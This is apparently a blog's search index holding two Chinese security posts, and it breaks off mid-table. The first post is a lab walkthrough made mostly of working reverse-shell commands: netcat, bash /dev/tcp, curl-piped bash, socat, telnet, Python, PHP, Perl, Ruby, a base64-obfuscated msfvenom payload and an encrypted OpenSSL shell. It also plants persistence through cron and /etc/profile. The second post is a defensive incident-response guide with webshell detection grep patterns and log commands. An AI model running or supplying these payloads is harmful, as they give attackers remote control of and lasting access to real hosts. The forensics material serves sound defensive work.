<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Linux反弹shell多种姿态</title>
      <link href="2021/05/14/Linux%E5%8F%8D%E5%BC%B9shell%E5%A4%9A%E7%A7%8D%E5%A7%BF%E6%80%81/"/>
      <url>2021/05/14/Linux%E5%8F%8D%E5%BC%B9shell%E5%A4%9A%E7%A7%8D%E5%A7%BF%E6%80%81/</url>
      
        <content type="html"><![CDATA[<h2 id="linux-反弹shell多种姿态"><a class="markdownIt-Anchor" href="#linux-反弹shell多种姿态">#</a> Linux 反弹 shell 多种姿态</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原理:反弹shell就是控制端监听在某TCP/UDP端口，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机</span><br></pre></td></tr></table></figure><p>一般反弹 shell 分为两种</p><ul><li>正向连接</li></ul><p>用于情况一般为我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标 ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web 服务、ssh、telnet 等等都是正向连接。</p><ul><li>反向连接</li></ul><p>反弹 shell 通常适用于如下几种情况：</p><ol><li>目标机因防火墙受限，目标机器只能发送请求，不能接收请求。</li><li>目标机端口被占用。</li><li>目标机位于局域网，或 IP 会动态变化，攻击机无法直接连接。</li><li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。</li></ol><p>实验坏境</p><p>攻击机：Kali（172.16.9.200）</p><p>目标主机：Ubuntu（172.16.9.199）</p><h3 id="普通反弹shell"><a class="markdownIt-Anchor" href="#普通反弹shell">#</a> 普通反弹 shell</h3><p>攻击机开启本地监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 3333</span><br></pre></td></tr></table></figure><p>目标机主动连接攻击机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netcat 172.16.9.200 3333 -e /bin/bash</span><br></pre></td></tr></table></figure><p>执行效果：</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514112125091.png" alt="image-20210514112125091"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514112117079.png" alt="image-20210514112117079"></p><h3 id="利用bash反弹shell"><a class="markdownIt-Anchor" href="#利用bash反弹shell">#</a> 利用 Bash 反弹 shell</h3><p>攻击机开启本地监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 3333</span><br></pre></td></tr></table></figure><p>目标机主动连接攻击机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/172.16.9.200/3333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>执行效果，直接获取到 bash</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514112313985.png" alt="image-20210514112313985"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514112324027.png" alt="image-20210514112324027"></p><h3 id="curl配合bash反弹shell"><a class="markdownIt-Anchor" href="#curl配合bash反弹shell">#</a> Curl 配合 Bash 反弹 shell</h3><p>攻击机开启本地监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 3333</span><br></pre></td></tr></table></figure><p>目标机 这里操作也很简单，借助了 Linux 中的管道</p><p>首先，在攻击者 vps 的 web 目录里面创建一个 <code>index文件</code> （index.php 或 index.html），内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /var/www/html/index.html</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/172.16.9.200/3333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>并开启 3333 端口的监听，然后再目标机上执行如下，即可反弹 shell：<img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514112954090.png" alt="image-20210514112954090"></p><p>执行效果：</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514113144365.png" alt="image-20210514113144365"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514113155864.png" alt="image-20210514113155864"></p><p>Curl 配合 Bash 反弹 shell 的方式在 CTF 题目中经常出现， <code>curl IP|bash</code>  中的 IP 可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等。</p><h3 id="写入定时任务反弹shell"><a class="markdownIt-Anchor" href="#写入定时任务反弹shell">#</a> 写入定时任务反弹 shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们可以在目标主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 /var/spool/cron/[crontabs]/&lt;username&gt; 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。</span><br></pre></td></tr></table></figure><ul><li>当前用户名为 root，我们就要将下面内容写入到 /var/spool/cron/root 中。(centos 系列主机)</li><li>当前用户名为 root，我们就要将下面内容写入到 /var/spool/cron/crontabs/root 中。(Debian/Ubuntu 系列主机)</li></ul><p>实现效果</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514142719763.png" alt="image-20210514142719763"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514142726506.png" alt="image-20210514142726506"></p><h3 id="写入etcprofile文件反弹shell"><a class="markdownIt-Anchor" href="#写入etcprofile文件反弹shell">#</a> 写入 /etc/profile 文件反弹 shell</h3><p>将以下反弹 shell 的命写入 /etc/profile 文件中，/etc/profile 中的内容会在用户打开 bash 窗口时执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/172.16.9.200/3333 0&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514142942758.png" alt="image-20210514142942758"></p><p>当目标主机管理员远程连接该主机时，就会执行该命令，成功获得目标机的 shell：</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514143946125.png" alt="image-20210514143946125"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514144000488.png" alt="image-20210514144000488"></p><h3 id="利用socat反弹shell"><a class="markdownIt-Anchor" href="#利用socat反弹shell">#</a> 利用 socat 反弹 shell</h3><p>攻击机开启本地监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:2222 - 或</span><br><span class="line">nc -lvvp 2222</span><br></pre></td></tr></table></figure><p>目标机主动连接主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-connect:172.16.9.200:2222 exec:&#x27;bash -li&#x27;,ptr,stderr,setsid,sight,sane</span><br></pre></td></tr></table></figure><p>实现效果</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514145043081.png" alt="image-20210514145043081"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514145051036.png" alt="image-20210514145051036"></p><h3 id="利用telnet反弹shell"><a class="markdownIt-Anchor" href="#利用telnet反弹shell">#</a> 利用 telnet 反弹 shell</h3><p>攻击机开启本地监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2222</span><br></pre></td></tr></table></figure><p>目标机主动连接主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod a p; telnet 172.16.9.200 2222 0&lt;a | /bin/bash 1&gt;a</span><br></pre></td></tr></table></figure><p>实现效果</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514145347386.png" alt="image-20210514145347386"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514145359190.png" alt="image-20210514145359190"></p><h2 id="各种脚本反弹shell"><a class="markdownIt-Anchor" href="#各种脚本反弹shell">#</a> 各种脚本反弹 shell</h2><h3 id="python脚本反弹shell"><a class="markdownIt-Anchor" href="#python脚本反弹shell">#</a> python 脚本反弹 shell</h3><p>攻击机开启本地监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2222</span><br></pre></td></tr></table></figure><p>目标机主动连接主机</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.16.9.200&quot;,2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514145830300.png" alt="image-20210514145830300"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514145838061.png" alt="image-20210514145838061"></p><h3 id="php脚本反弹shell"><a class="markdownIt-Anchor" href="#php脚本反弹shell">#</a> php 脚本反弹 shell</h3><p>攻击机开启本地监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2222</span><br></pre></td></tr></table></figure><p>目标机主动连接主机 (一)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;172.16.9.200&quot;,2222);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514150401946.png" alt="image-20210514150401946"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514150354093.png" alt="image-20210514150354093"></p><p>目标机主动连接主机 (二)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/172.16.9.200/2222 0&gt;&amp;1&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><p>实现效果</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514151453583.png" alt="image-20210514151453583"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514151533954.png" alt="image-20210514151533954"></p><h3 id="perl脚本反弹shell"><a class="markdownIt-Anchor" href="#perl脚本反弹shell">#</a> perl 脚本反弹 shell</h3><p>攻击机开启本地监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2222</span><br></pre></td></tr></table></figure><p>目标主机连接攻击机</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;172.16.9.200&quot;;$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure><p>实现效果</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514152127846.png" alt="image-20210514152127846"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514152135839.png" alt="image-20210514152135839"></p><h3 id="ruby脚本反弹shell"><a class="markdownIt-Anchor" href="#ruby脚本反弹shell">#</a> Ruby 脚本反弹 shell</h3><p>攻击机开启本地监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2222</span><br></pre></td></tr></table></figure><p>目标主机连接攻击机</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;c=TCPSocket.new(&quot;172.16.9.200&quot;,&quot;2222&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br><span class="line">或</span><br><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;172.16.9.200&quot;,&quot;2222&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure><p>实现效果</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514153951128.png" alt="image-20210514153951128"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514153957273.png" alt="image-20210514153957273"></p><h3 id="利用metasploit生成反弹shell一句话"><a class="markdownIt-Anchor" href="#利用metasploit生成反弹shell一句话">#</a> 利用 metasploit 生成反弹 shell 一句话</h3><p>攻击机开启本地监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2222</span><br></pre></td></tr></table></figure><p>我们直接可以使用<strong> msfvenom -l</strong> 结合关键字过滤（如 = cmd/unix/reverse），列出我们需要生成的各类反弹 shell 一句话的 payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads | grep &#x27;cmd/unix/reverse&#x27;</span><br></pre></td></tr></table></figure><p>生成一个 python 反弹 shell 的一句话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=172.16.9.200 LPORT=3333 -f raw &gt; shell.py</span><br><span class="line">cat shell.py</span><br></pre></td></tr></table></figure><p>将 shell.py 内容复制到目标主机进行执行</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514154549401.png" alt="image-20210514154549401"></p><p>目标主机执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;exec(__import__(&#x27;base64&#x27;).b64decode(__import__(&#x27;codecs&#x27;).getencoder(&#x27;utf-8&#x27;)(&#x27;aW1wb3J0IHNvY2tldCAgICAgICAgLCAgICAgc3VicHJvY2VzcyAgICAgICAgLCAgICAgb3MgIDsgICAgICAgICBob3N0PSIxNzIuMTYuOS4yMDAiICA7ICAgICAgICAgcG9ydD0yMjIyICA7ICAgICAgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICAgICAgICAsICAgICBzb2NrZXQuU09DS19TVFJFQU0pICA7ICAgICAgICAgcy5jb25uZWN0KChob3N0ICAgICAgICAsICAgICBwb3J0KSkgIDsgICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAgICwgICAgIDApICA7ICAgICAgICAgb3MuZHVwMihzLmZpbGVubygpICAgICAgICAsICAgICAxKSAgOyAgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgLCAgICAgMikgIDsgICAgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik=&#x27;)[0]))&quot;</span></span><br></pre></td></tr></table></figure><p>实现效果</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514154730993.png" alt="image-20210514154730993"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514154739869.png" alt="image-20210514154739869"></p><h3 id="利用openssl反弹加密shell"><a class="markdownIt-Anchor" href="#利用openssl反弹加密shell">#</a> 利用 OpenSSL 反弹加密 shell</h3><p>如果我们需要对通信的内容进行混淆或加密，这时可以选择使用 OpenSSL 反弹一个加密的 shell。</p><p>首先在攻击机 kali 生成自签名证书</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514160946360.png" alt="image-20210514160946360"></p><p>利用上一步生成的自签名证书，在攻击机上使用 OpenSSL 监听一个端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 2222</span><br></pre></td></tr></table></figure><p>目标机进行反弹 shell 操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 172.16.9.200:2222 &gt; /tmp/s; rm /tmp/s</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514161122042.png" alt="image-20210514161122042"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210514161128816.png" alt="image-20210514161128816"></p><h3 id="扩展反弹shell后获取终端"><a class="markdownIt-Anchor" href="#扩展反弹shell后获取终端">#</a> 扩展反弹 shell 后获取终端</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line">/bin/bash -i</span><br><span class="line">echo os.system(&quot;/bin/bash&quot;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Linux反弹shell多种姿态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>溯源取证总结</title>
      <link href="2021/05/05/%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/"/>
      <url>2021/05/05/%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="溯源取证总结"><a class="markdownIt-Anchor" href="#溯源取证总结">#</a> 溯源取证总结</h2><h4 id="类型"><a class="markdownIt-Anchor" href="#类型">#</a> 类型</h4><ul><li>web 入侵：挂马、网页篡改（博彩 / 黑帽 SEO 等）、植入 webshell，黑页，暗链等</li><li>主机入侵：病毒木马、勒索软件、远控后门、系统异常、RDP 爆破、SSH 爆破、主机漏洞、数据库入侵等</li><li>网络攻击：DDOS 攻击、DNS/HTTP 劫持、ARP 欺骗等</li><li>路由器 / 交换机异常：内网病毒，配置错误等</li></ul><h4 id="初步信息收集"><a class="markdownIt-Anchor" href="#初步信息收集">#</a> 初步信息收集</h4><ul><li>客户属性：如名称 / 区域 / 领域等</li><li>入侵范围：如主机数 / 网段等</li><li>入侵现象：如 cpu 过高，勒索界面，异常网络链接，安全设备告警等</li><li>客户需求：是否要求溯源，是否要求协助修复等</li><li>收集信息：操作系统版本，补丁，数据库版本，中间件 / 服务器，网络拓扑，受害范围，处置情况，提取日志（主机，安全设备，数据库等）</li></ul><p>应急响应资源:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZUxTQS9oYWNrLWVyLXRvb2xz">https://github.com/theLSA/hack-er-tools</span></p><h4 id="分析流程image-20210505094445689"><a class="markdownIt-Anchor" href="#分析流程image-20210505094445689">#</a> 分析流程<img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210505094445689.png" alt="image-20210505094445689"></h4><h2 id="web应急响应"><a class="markdownIt-Anchor" href="#web应急响应">#</a> Web 应急响应</h2><p><code>各类中间件/服务器日志默认存放位置</code></p><table><thead><tr><th>服务名</th><th>服务器日志默认存放位置</th></tr></thead><tbody><tr><td>IIS</td><td>C:\WINDOWS\system32\LogFiles</td></tr><tr><td>apache</td><td>Linux：/usr/local/apache/logs/<br/>Windows：apache/logs/</td></tr><tr><td>tomcat</td><td>conf/logging.properties<br/>logs/catalina.xx.log<br/>logs/host-manager.xx.log<br/>logs/localhost.xx.log<br/>logs/manager.xx.log<br/>主要记录系统启、关闭日志、管理日志和异常信息</td></tr><tr><td>weblogic</td><td>domain_name/servers/server_name/logs/<br/>server_name.log：server 启停日志<br/>access.log：安装在该 server 之上的应用 http 访问日志</td></tr><tr><td>jboss</td><td>LOG4J 配置默认 Deploy/conf/<br/>如 jboss/server/default/conf/jboss-log4j.xml</td></tr></tbody></table><h4 id="webshell排查"><a class="markdownIt-Anchor" href="#webshell排查">#</a> webshell 排查</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 整站打包用webshell扫描工具扫</span><br><span class="line">2. 利用Linux find命令查询木马</span><br></pre></td></tr></table></figure><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/ -name <span class="string">&quot;*.php&quot;</span> |xargs egrep &#x27;assert|phpspy|c<span class="number">99</span>sh|milw<span class="number">0</span>rm|eval|(<span class="name">gunerpress</span>|</span><br><span class="line">(<span class="name">base64_decoolcode</span>|spider_bc|shell_exec|passthru|($_\POST[|eval</span><br><span class="line">(<span class="name">str_rot13</span>|.chr(|$&#123;<span class="string">&quot;_P|eval($_R|file_put_contents(.*$_|base64_decode</span></span><br></pre></td></tr></table></figure><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -i –r eval($_post /app/website/*</span><br></pre></td></tr></table></figure><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /app/website/ -type f|xargs grep eval($_post</span><br></pre></td></tr></table></figure><h4 id="数据库排查"><a class="markdownIt-Anchor" href="#数据库排查">#</a> 数据库排查</h4><p><code>mysql和mssql日志</code></p><table><thead><tr><th>日志类型 (mysql)</th><th></th></tr></thead><tbody><tr><td>错误日志</td><td>默认开启，hostname.error</td></tr><tr><td>查询日志</td><td>记录用户的所有操作。默认关闭，general_log_file（常见 getshell 手法）</td></tr><tr><td>慢查询日志</td><td>记录执行时间超过指定时间的查询语句，slow_query_log_file（慢查询 getshell）</td></tr><tr><td>事务日志</td><td>ib_logfile0</td></tr><tr><td>二进制日志</td><td>记录修改数据或有可能引起数据改变的 mysql 语句，log_bin，默认在数据目录，如<br/>mysql-bin.000001</td></tr><tr><td>日志类型 (mssql) 版本 ****</td><td><strong>默认路径</strong></td></tr><tr><td>SQL SERVER 2005</td><td>Program Files\Microsoft SQL Server\MSSQL.<em>n</em>\MSSQL\LOG</td></tr><tr><td>SQL SERVER 2008</td><td>Program Files\Microsoft SQL Server\MSSQL10. 实例名 \MSSQL\LOG</td></tr><tr><td>SQL SERVER 2008 R2</td><td>Program Files\Microsoft SQL Server\MSSQL10_50. 实例名 \MSSQL\LOG</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">小总结</span><br><span class="line">1. mysql\lib\plugin目录的异常文件</span><br><span class="line"></span><br><span class="line">2. select * from mysql.func的异常</span><br><span class="line"></span><br><span class="line">3. mssql检查xp_cmdshell等存储过程</span><br><span class="line"></span><br><span class="line">4. 异常数据库登录</span><br><span class="line"></span><br><span class="line">5. 数据库用户弱口令</span><br><span class="line"></span><br><span class="line">6. mysql相关命令</span><br><span class="line">show global variables like &#x27;%log%&#x27;;</span><br><span class="line">show global variables like &#x27;%gene%&#x27;;</span><br><span class="line">show master status;</span><br><span class="line">systemmore /mydata/data/stu18_slow.log;</span><br><span class="line">showbinary logs;</span><br><span class="line">showmaster logs;</span><br><span class="line">showbinlog events in &#x27;mysql-bin.000011&#x27;;</span><br><span class="line">show processlist;</span><br></pre></td></tr></table></figure><h2 id="linux应急响应"><a class="markdownIt-Anchor" href="#linux应急响应">#</a> Linux 应急响应</h2><h4 id="文件"><a class="markdownIt-Anchor" href="#文件">#</a> 文件</h4><table><thead><tr><th>Linux 命令</th><th>说明</th></tr></thead><tbody><tr><td>ls -alt</td><td>按时间排序以长字符串的形式显示所有文件</td></tr><tr><td>find / -ctime 2</td><td>查找 72 小时内新增的文件</td></tr><tr><td>find ./ -mtime 0 -name “*.jsp”</td><td>查找 24 小时内被修改的 JSP 文件</td></tr><tr><td>ls -al /tmp |grep “Feb 27”</td><td>根据确定时间去反推变更的文件</td></tr><tr><td>find / *.jsp -perm 4777</td><td>查找 777 的权限的文件</td></tr><tr><td>strings /usr/bin/.sshd |egrep ‘<span 1,3="">1-9</span>.<span 1,3="">1-9</span>.’</td><td>分析 sshd 文件是否包括 IP 信息</td></tr><tr><td>find /etc/ /usr/bin/ /usr/sbin/ /bin/ /usr/local/bin/ -type f -mtime 0</td><td>更改的信息</td></tr><tr><td>find /tmp -iname “*” -atime 1 -type f</td><td>访问的信息</td></tr><tr><td>/var/run/utmp 有关当前登录用户的信息记录<br/>~/.ssh<br/>/etc/passwd 用户列表</td><td>文件日期、新增文件、可疑 / 异常文件、最近使用文件、浏览器下载文件</td></tr></tbody></table><h4 id="日志"><a class="markdownIt-Anchor" href="#日志">#</a> 日志</h4><p>这里附上一张图片</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210505103536118.png" alt="image-20210505103536118"></p><p>补充</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/var/log/wtmp 登录进入，退出，数据交换、关机和重启纪录，即last</span><br><span class="line">/var/log/lastlog 文件记录用户最后登录的信息，即lastlog</span><br><span class="line">/var/log/secure 记录登入系统存取数据的文件，如 pop3/ssh/telnet/ftp</span><br><span class="line">/var/log/cron 与定时任务相关的日志信息，记录crontab命令是否被正确的执行</span><br><span class="line">/var/log/message 系统启动后的信息和错误日志,包括整体系统信息</span><br><span class="line">/var/log/apache2/access.log apache有关权限日志</span><br><span class="line">/var/log/auth.log 包含系统授权信息，包括用户登录和使用的权限机制等</span><br><span class="line">/var/log/userlog 记录所有等级用户信息的日志</span><br><span class="line">/var/log/xferlog(vsftpd.log)记录Linux FTP日志</span><br><span class="line">/var/log/secure 记录大多数应用输入的账号与密码，登录成功与否</span><br><span class="line">/var/log/faillog 记录登录系统不成功的账号信息</span><br><span class="line">扩展（历史记录）</span><br><span class="line">history (cat /root/.bash_history)</span><br><span class="line">mysql-history (cat /root/.mysql_history)</span><br></pre></td></tr></table></figure><p>利用正则表达式筛选条件</p><table><thead><tr><th>正则表达式筛选条件</th><th>效果</th></tr></thead><tbody><tr><td>grep ‘Failed’ /var/log/secure |awk ‘{print $11}’ |sort |uniq -c |sort -nr</td><td>查看爆破失败的 IP</td></tr><tr><td>grep ‘Accepted’ /var/log/secure |awk ‘{print $11}’ |sort |uniq -c |sort -nr</td><td>查看登录成功的 IP</td></tr><tr><td>grep “Failed password for root” /var/log/auth.log |awk ‘{print $11}’ |sort |uniq -c |sort -nr |more</td><td>定位有多少 IP 在爆破主机的 root 帐号</td></tr><tr><td>grep &quot;Accepted &quot; /var/log/auth.log |awk ‘{print $11}’ |sort |uniq -c |sort -nr |more</td><td>登录成功的 IP</td></tr><tr><td>tail -400f demo.log</td><td>监控最后 400 行日志文件的变化 等价与 tail -n 400 -f （-f 参数是实时）</td></tr><tr><td>uniq -c demo.log</td><td>标记该行重复的数量，不重复值为 1</td></tr><tr><td>grep -c ‘ERROR’ demo.log<br/>cat /var/log/secure |grep 'Accepted password‘</td><td>输出文件 demo.log 中查找所有包行 ERROR 的行的数量</td></tr><tr><td>grep &quot;Accepted &quot; /var/log/secure* |awk ‘{print $1,$2,$3,$9,$11}’</td><td>查看登录成功的日期、用户名及 IP</td></tr><tr><td>grep “refused” /var/log/secure* |awk {‘print $9’} |sort |uniq -c |sort -nr |more （开启 iptables 的情况）<br/>grep “Failed password” /var/log/secure* |grep -E -o “((<span 1,3="">0-9</span>).(<span 1,3="">0-9</span>).(<span 1,3="">0-9</span>).(<span 